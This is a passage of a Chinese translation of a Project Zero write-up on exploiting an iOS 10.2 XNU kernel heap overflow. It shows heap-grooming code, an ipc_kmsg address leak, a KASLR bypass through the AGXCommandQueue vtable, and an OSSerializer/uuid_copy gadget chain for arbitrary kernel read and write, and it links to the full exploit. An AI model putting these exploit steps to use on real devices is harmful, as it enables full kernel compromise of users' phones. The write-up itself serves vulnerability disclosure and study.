+&nbsp;&nbsp;uint64_t&nbsp;itk_space&nbsp;=&nbsp;rk64(task_t&nbsp;+&nbsp;struct_task_itk_space_offset);
+&nbsp;&nbsp;uint64_t&nbsp;is_table&nbsp;=&nbsp;rk64(itk_space&nbsp;+&nbsp;struct_ipc_space_is_table_offset);
+&nbsp;&nbsp;return&nbsp;is_table;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这些代码片段都使用了通过内核任务端口读取内核内存的mach_portal利用代码的rk64（）函数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我通过试错法来确定哪些值覆盖ikm_size后可以使异常消息的受控部分与下一个堆对象的开头对齐。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">get-where-what</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">解决这个谜题的最后一步是要能够找到受控数据在哪里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本地提权攻击的上下文中实现该目的的一种方法是将这种数据放置到用户空间中，但像x86上的SMAP和iPhone 7上的AMCC硬件这样的硬件安全措施使得这种方法非常困难。因此，我们将构建一个新的原语，以找出我们的ipc_kmsg缓冲区在内核内存中的位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直到现在还没有触及的一个方面是如何将ipc_kmsg分配到我们要溢出的缓冲区边上。Stefan Esser曾经在一些演讲中谈过近几年zalloc堆的演变情况，最新的演讲具有区释放列表随机化的细节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在使用上述内省技术对堆行为进行实验的过程中，我注意到某些尺寸的类实际上仍然以接近线性的方式进行分配（后面的分配是连续的）。事实证明，这是由于zalloc是从较低级别的分配器获取内存页的；通过耗尽特定区域，我们可以强制zalloc获取新页面，如果我们的分配大小接近页面大小，我们就能立即将该页面返回。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这意味着我们可以使用如下代码：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;int&nbsp;prealloc_size&nbsp;=&nbsp;0x900;&nbsp;//&nbsp;kalloc.4096
+&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;2000;&nbsp;i++){
+&nbsp;&nbsp;&nbsp;&nbsp;prealloc_port(prealloc_size);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;//&nbsp;these&nbsp;will&nbsp;be&nbsp;contiguous&nbsp;now,&nbsp;convenient!
+&nbsp;&nbsp;mach_port_t&nbsp;holder&nbsp;=&nbsp;prealloc_port(prealloc_size);
+&nbsp;&nbsp;mach_port_t&nbsp;first_port&nbsp;=&nbsp;prealloc_port(prealloc_size);
+&nbsp;&nbsp;mach_port_t&nbsp;second_port&nbsp;=&nbsp;prealloc_port(prealloc_size);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了获得如下所示的堆布局：&nbsp;</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0107c650497d561428.png" title="t01f2cbbc73442cb9f8.png" alt="http://p9.qhimg.com/t01f2cbbc73442cb9f8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该方法并非十分可靠；对于具有更多RAM的设备来说，您需要增加区耗尽循环的迭代次数。这不是一个完美的技术，但对于一个研究工具来说，效果非常好。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们现在可以释放holder端口，触发溢出，这将重用holder所在的槽并溢出到first_port，然后再使用另一个holder端口抓取这个槽：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;//&nbsp;free&nbsp;the&nbsp;holder:
+&nbsp;&nbsp;mach_port_destroy(mach_task_self(),&nbsp;holder);
+&nbsp;&nbsp;//&nbsp;reallocate&nbsp;the&nbsp;holder&nbsp;and&nbsp;overflow&nbsp;out&nbsp;of&nbsp;it
+&nbsp;&nbsp;uint64_t&nbsp;overflow_bytes[]&nbsp;=&nbsp;{0x1104,0,0,0,0,0,0,0};
+&nbsp;&nbsp;do_overflow(0x1000,&nbsp;64,&nbsp;overflow_bytes);
+&nbsp;&nbsp;//&nbsp;grab&nbsp;the&nbsp;holder&nbsp;again
+&nbsp;&nbsp;holder&nbsp;=&nbsp;prealloc_port(prealloc_size);</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t0111a233dda741491e.png" title="t01f822640a030e6c07.png" alt="http://p9.qhimg.com/t01f822640a030e6c07.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">溢出已将属于第一个端口的预先分配的ipc_kmsg的ikm_size字段更改为0x1104。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ipc_kmsg结构由ipc_get_kmsg_from_kernel填写后，将通过ipc_kmsg_enqueue放入目标端口的待处理消息队列：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void&nbsp;ipc_kmsg_enqueue(ipc_kmsg_queue_t&nbsp;queue,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ipc_kmsg_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kmsg)
+{
+&nbsp;&nbsp;ipc_kmsg_t&nbsp;first&nbsp;=&nbsp;queue-&gt;ikmq_base;
+&nbsp;&nbsp;ipc_kmsg_t&nbsp;last;
+&nbsp;&nbsp;if&nbsp;(first&nbsp;==&nbsp;IKM_NULL)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;queue-&gt;ikmq_base&nbsp;=&nbsp;kmsg;
+&nbsp;&nbsp;&nbsp;&nbsp;kmsg-&gt;ikm_next&nbsp;=&nbsp;kmsg;
+&nbsp;&nbsp;&nbsp;&nbsp;kmsg-&gt;ikm_prev&nbsp;=&nbsp;kmsg;
+&nbsp;&nbsp;}&nbsp;else&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;last&nbsp;=&nbsp;first-&gt;ikm_prev;
+&nbsp;&nbsp;&nbsp;&nbsp;kmsg-&gt;ikm_next&nbsp;=&nbsp;first;
+&nbsp;&nbsp;&nbsp;&nbsp;kmsg-&gt;ikm_prev&nbsp;=&nbsp;last;
+&nbsp;&nbsp;&nbsp;&nbsp;first-&gt;ikm_prev&nbsp;=&nbsp;kmsg;
+&nbsp;&nbsp;&nbsp;&nbsp;last-&gt;ikm_next&nbsp;=&nbsp;kmsg;
+&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果端口有挂起的消息，则ipc_kmsg的ikm_next和ikm_prev字段将指向挂起的消息的双向链接列表。但如果端口没有挂起的消息，那么ikm_next和ikm_prev都设置为指向本身的kmsg。下面我们使用这个事实来读回第二个ipc_kmsg缓冲区的地址：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;uint64_t&nbsp;valid_header[]&nbsp;=&nbsp;{0xc40,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0};
+&nbsp;&nbsp;send_prealloc_msg(first_port,&nbsp;valid_header,&nbsp;8);
+&nbsp;&nbsp;//&nbsp;send&nbsp;a&nbsp;message&nbsp;to&nbsp;the&nbsp;second&nbsp;port
+&nbsp;&nbsp;//&nbsp;writing&nbsp;a&nbsp;pointer&nbsp;to&nbsp;itself&nbsp;in&nbsp;the&nbsp;prealloc&nbsp;buffer
+&nbsp;&nbsp;send_prealloc_msg(second_port,&nbsp;valid_header,&nbsp;8);
+&nbsp;&nbsp;//&nbsp;receive&nbsp;on&nbsp;the&nbsp;first&nbsp;port,&nbsp;reading&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;second:
+&nbsp;&nbsp;uint64_t*&nbsp;buf&nbsp;=&nbsp;receive_prealloc_msg(first_port);
+&nbsp;&nbsp;//&nbsp;this&nbsp;is&nbsp;the&nbsp;address&nbsp;of&nbsp;second&nbsp;port
+&nbsp;&nbsp;kernel_buffer_base&nbsp;=&nbsp;buf[1];</pre><p style="text-align:center"><img src="http://p4.qhimg.com/t01cc3624d43d299e8f.png" title="t01a56fd0a4750b3dce.png" alt="http://p7.qhimg.com/t01a56fd0a4750b3dce.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面是send_prealloc_msg的实现：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void&nbsp;send_prealloc_msg(mach_port_t&nbsp;port,&nbsp;uint64_t*&nbsp;buf,&nbsp;int&nbsp;n)&nbsp;{
+&nbsp;&nbsp;struct&nbsp;thread_args*&nbsp;args&nbsp;=&nbsp;malloc(sizeof(struct&nbsp;thread_args));
+&nbsp;&nbsp;memset(args,&nbsp;0,&nbsp;sizeof(struct&nbsp;thread_args));
+&nbsp;&nbsp;memcpy(args-&gt;buf,&nbsp;buf,&nbsp;n*8);
+&nbsp;&nbsp;args-&gt;exception_port&nbsp;=&nbsp;port;
+&nbsp;&nbsp;//&nbsp;start&nbsp;a&nbsp;new&nbsp;thread&nbsp;passing&nbsp;it&nbsp;the&nbsp;buffer&nbsp;and&nbsp;the&nbsp;exception&nbsp;port
+&nbsp;&nbsp;pthread_t&nbsp;t;
+&nbsp;&nbsp;pthread_create(&amp;t,&nbsp;NULL,&nbsp;do_thread,&nbsp;(void*)args);
+&nbsp;&nbsp;//&nbsp;associate&nbsp;the&nbsp;pthread_t&nbsp;with&nbsp;the&nbsp;port&nbsp;
+&nbsp;&nbsp;//&nbsp;so&nbsp;that&nbsp;we&nbsp;can&nbsp;join&nbsp;the&nbsp;correct&nbsp;pthread
+&nbsp;&nbsp;//&nbsp;when&nbsp;we&nbsp;receive&nbsp;the&nbsp;exception&nbsp;message&nbsp;and&nbsp;it&nbsp;exits:
+&nbsp;&nbsp;kern_return_t&nbsp;err&nbsp;=&nbsp;mach_port_set_context(mach_task_self(),
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(mach_port_context_t)t);
+&nbsp;&nbsp;//&nbsp;wait&nbsp;until&nbsp;the&nbsp;message&nbsp;has&nbsp;actually&nbsp;been&nbsp;sent:
+&nbsp;&nbsp;while(!port_has_message(port)){;}
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">请记住，要将受控数据导入端口预分配的ipc_kmsg中，我们需要内核向其发送异常消息，因此send_prealloc_msg必须导致该异常才行。它需要分配一个 thread_args结构，其中包含在消息和目标端口中所需的受控数据的副本，然后启动将调用do_thread的新线程：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">void*&nbsp;do_thread(void*&nbsp;arg)&nbsp;{
+&nbsp;&nbsp;struct&nbsp;thread_args*&nbsp;args&nbsp;=&nbsp;(struct&nbsp;thread_args*)arg;
+&nbsp;&nbsp;uint64_t&nbsp;buf[32];
+&nbsp;&nbsp;memcpy(buf,&nbsp;args-&gt;buf,&nbsp;sizeof(buf));
+&nbsp;&nbsp;kern_return_t&nbsp;err;
+&nbsp;&nbsp;err&nbsp;=&nbsp;thread_set_exception_ports(mach_thread_self(),
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXC_MASK_ALL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;args-&gt;exception_port,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXCEPTION_STATE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ARM_THREAD_STATE64);
+&nbsp;&nbsp;free(args);
+&nbsp;&nbsp;load_regs_and_crash(buf);
+&nbsp;&nbsp;return&nbsp;NULL;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">do_thread将受控数据从thread_args结构复制到本地缓冲区，然后将目标端口设置为该线程的异常处理程序。它会释放参数结构，然后调用load_regs_and_crash，它是一个简单的汇编器，用来将缓冲区的值复制到前30个ARM64通用寄存器中，并触发软件断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此时内核的中断处理程序将调用exception_deliver，它将查找线程的异常端口并调用MIG mach_exception_raise_state方法，该方法会将崩溃的线程的寄存器状态序列化为MIG消息，并调用mach_msg_rpc_from_kernel_body，该脚本将抓取异常端口的预先分配的ipc_kmsg，并信任 ikm_size字段，然后使用它将发送的消息与它认为的缓冲区结尾对齐：&nbsp;</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t019c2ac65c7a2048f4.png" title="t0137725b242a8a747f.png" alt="http://p3.qhimg.com/t0137725b242a8a747f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了实际读取数据，我们需要接收异常消息。就这里来说，我们得到了内核向第一个端口发送的消息，这个端口会影响向第二个端口上写入的有效报头。为什么通过内存损坏原语利用它已有的相同数据来覆盖下一条消息的报头呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">请注意，如果我们发送消息并立即接收的话，就能读回来我们所写的内容。为了读回有用的东西，我们必须进行相应的修改。我们可以在将消息发送到第一个端口之后且接收消息之前向第二个端口发送消息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据我之前的观察，如果一个端口的消息队列为空，当消息排队时，ikm_next字段将指向该消息本身。因此，通过向second_port发送消息（用一个使ipc_kmsg仍然有效且未被使用的内容覆盖它的报头），然后读回发送到第一个端口的消息，我们就能过确定第二个端口的ipc_kmsg缓冲区的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从读/写到任意读/写&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们已经使得堆溢出获取了可靠覆盖并读取first_port ipc_kmsg对象之后的240字节区域的内容的能力了，这正是我们想要的。我们也知道该内存区位于内核的虚拟地址空间中。最后一步是将其转化为具备读写任意内核内存的能力。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">虽然mach_portal漏洞利用代码可用于内核任务端口对象。但是，这一次我选择了一条不同的路径，主要是受到了Lookout writeup中详细描述的Pegasus漏洞利用代码中一个简洁技巧的启发。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">开发过这个漏洞利用代码的人都发现IOKit Serializer :: serialize方法是一个非常便捷的小工具，可以将通过一个指向受控数据的参数调用一个函数的能力，转换为可以使用两个完全受控的参数调用另一个受控函数的能力。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为此，我们需要调用受控地址，将指针传递给受控数据。我们还需要知道OSSerializer :: serialize的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面，我们释放second_port并重新分配一个IOKit用户客户端：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;//&nbsp;send&nbsp;another&nbsp;message&nbsp;on&nbsp;first
+&nbsp;&nbsp;//&nbsp;writing&nbsp;a&nbsp;valid,&nbsp;safe&nbsp;header&nbsp;back&nbsp;over&nbsp;second
+&nbsp;&nbsp;send_prealloc_msg(first_port,&nbsp;valid_header,&nbsp;8);
+&nbsp;&nbsp;//&nbsp;free&nbsp;second&nbsp;and&nbsp;get&nbsp;it&nbsp;reallocated&nbsp;as&nbsp;a&nbsp;userclient:
+&nbsp;&nbsp;mach_port_deallocate(mach_task_self(),&nbsp;second_port);
+&nbsp;&nbsp;mach_port_destroy(mach_task_self(),&nbsp;second_port);
+&nbsp;&nbsp;mach_port_t&nbsp;uc&nbsp;=&nbsp;alloc_userclient();
+&nbsp;&nbsp;//&nbsp;read&nbsp;back&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;userclient&nbsp;buffer:
+&nbsp;&nbsp;buf&nbsp;=&nbsp;receive_prealloc_msg(first_port);
+&nbsp;&nbsp;//&nbsp;save&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;original&nbsp;object:
+&nbsp;&nbsp;memcpy(legit_object,&nbsp;buf,&nbsp;sizeof(legit_object));
+&nbsp;&nbsp;//&nbsp;this&nbsp;is&nbsp;the&nbsp;vtable&nbsp;for&nbsp;AGXCommandQueue
+&nbsp;&nbsp;uint64_t&nbsp;vtable&nbsp;=&nbsp;buf[0];</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">alloc_userclient分配AGXAccelerator IOService的用户客户端类型为5，它是一个AGXCommandQueue对象。IOKit的默认运算符operator new使用kalloc，AGXCommandQueue是0xdb8字节，因此它也将使用kalloc.4096内存区，并重用由second_port ipc_kmsg释放的内存。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">请注意，我们发送了另一个消息，其中有一个对first_port有效的报头，它用一个有效的报头来覆盖second_port的报头。这就是说，在second_port被释放并且为用户客户端重新使用内存之后，我们可以从first_port读出消息，并读回到AGXCommandQueue对象的前240个字节中。第一个qword是指向AGXCommandQueue的vtable的指针，使用它可以确定KASLR slide，从而计算出OSSerializer :: serialize的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在AGXCommandQueue用户客户端上调用任何IOKit MIG方法可能会导致至少三个虚拟调用： 用户客户端口的MIG intran将通过iokit_lookup_connect_port调用:: retain（）。这个方法也调用:: getMetaClass（）。最后，MIG包装器将调用iokit_remove_connect_reference，而它将调用:: release（）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于这些都是C ++虚拟方法，它们将作为第一个（隐含）参数传递这个指针，这意味着我们可以满足使用OSSerializer::serialize小工具所需条件了。让我们深入考察其工作原理：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">class&nbsp;OSSerializer&nbsp;:&nbsp;public&nbsp;OSObject
+{
+&nbsp;&nbsp;OSDeclareDefaultStructors(OSSerializer)
+&nbsp;&nbsp;void&nbsp;*&nbsp;target;
+&nbsp;&nbsp;void&nbsp;*&nbsp;ref;
+&nbsp;&nbsp;OSSerializerCallback&nbsp;callback;
+&nbsp;&nbsp;virtual&nbsp;bool&nbsp;serialize(OSSerialize&nbsp;*&nbsp;serializer)&nbsp;const;
+};
+bool&nbsp;OSSerializer::serialize(&nbsp;OSSerialize&nbsp;*&nbsp;s&nbsp;)&nbsp;const
+{
+&nbsp;&nbsp;return(&nbsp;(*callback)(target,&nbsp;ref,&nbsp;s)&nbsp;);
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果看一下OSSerializer::serialize的反汇编代码，就清楚了发生了什么事：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">;&nbsp;OSSerializer::serialize(OSSerializer&nbsp;*__hidden&nbsp;this,&nbsp;OSSerialize&nbsp;*)
+MOV&nbsp;&nbsp;X8,&nbsp;X1
+LDP&nbsp;&nbsp;X1,&nbsp;X3,&nbsp;[X0,#0x18]&nbsp;;&nbsp;load&nbsp;X1&nbsp;from&nbsp;[X0+0x18]&nbsp;and&nbsp;X3&nbsp;from&nbsp;[X0+0x20]
+LDR&nbsp;&nbsp;X9,&nbsp;[X0,#0x10]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;load&nbsp;X9&nbsp;from&nbsp;[X0+0x10]
+MOV&nbsp;&nbsp;X0,&nbsp;X9
+MOV&nbsp;&nbsp;X2,&nbsp;X8
+BR&nbsp;&nbsp;&nbsp;X3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;call&nbsp;[X0+0x20]&nbsp;with&nbsp;X0=[X0+0x10]&nbsp;and&nbsp;X1=[X0+0x18]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于我们对AGXCommandQueue用户客户端的前240个字节具有读/写权限，并且我们知道它在内存中的位置，所以我们可以使用以下伪造对象来替换它，该虚拟对象会将一个虚拟调用转换为一个任意函数指针的调用，并且带两个受控参数：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01d80ca053478a5b1b.png" title="t013ec8d8be398c1853.png" alt="http://p8.qhimg.com/t013ec8d8be398c1853.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们已将vtable指针重定向到该对象，以便对所需vtable条目与数据进行相应的处理。我们现在还需要一个原语，将具有两个受控参数的任意函数调用转换为任意内存读/写。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">像copyin和copyout这样的函数都是不错的候选者，因为它们都能处理跨用户/内核边界的内存拷贝，但它们都有三个参数：源、目的地和大小，我们只能完全控制两个。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然而，由于我们已经有能力从用户空间中读取和写入这个伪造对象，所以我们实际上可以将值拷贝到这个内核缓冲区中，而不必直接拷贝到用户空间。这意味着我们可以将搜索扩展到任何内存复制函数，如memcpy。当然，memcpy、memmove和bcopy都有三个参数，所以我们需要的是一个传递固定大小的封装器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查看这些函数的交叉引用，我们发现了uuid_copy：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">;&nbsp;uuid_copy(uuid_t&nbsp;dst,&nbsp;const&nbsp;uuid_t&nbsp;src)
+MOV&nbsp;&nbsp;W2,&nbsp;#0x10&nbsp;;&nbsp;size
+B&nbsp;&nbsp;&nbsp;&nbsp;_memmove</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个函数只是简单的封装memmove，使其总是传递固定大小的16字节。让我们将最终的原始数据整合到序列化器小工具中：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01349ad0b6ea3496f4.png" title="t01bd4d4f3180e17581.png" alt="http://p6.qhimg.com/t01bd4d4f3180e17581.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了使把读操作变成写操作，我们只要交换参数的顺序，从任意地址拷贝到我们的伪用户客户端对象中，然后接收异常消息来读取读出数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">您可以在iPod 6G上下载我的iOS 10.2的漏洞利用代码： https://bugs.chromium.org/p/project-zero/issues/detail?id=1004#c4</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个漏洞也是由Marco Grassi和qwertyoruiopz独立发现和利用的，检查他们的代码可以看到，他们使用了一个不同的方法来利用这个漏洞，不过也使用了mach端口。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">结语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">每个开发人员都会犯错误，并且它们是软件开发过程的一个自然部分。然而，运行XNU的1B +设备上的全新内核代码值得特别注意。在我看来，这个错误是苹果代码审查流程的明显失职，我希望漏洞和这类报道应该认真对待，并从中学到一些经验教训。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://googleprojectzero.blogspot.jp/2017/04/exception-oriented-exploitation-on-ios.html" target="_blank">原文链接：https://googleprojectzero.blogspot.jp/2017/04/exception-oriented-exploitation-on-ios.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】深入分析基于异常的 iOS 漏洞利用技术   - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
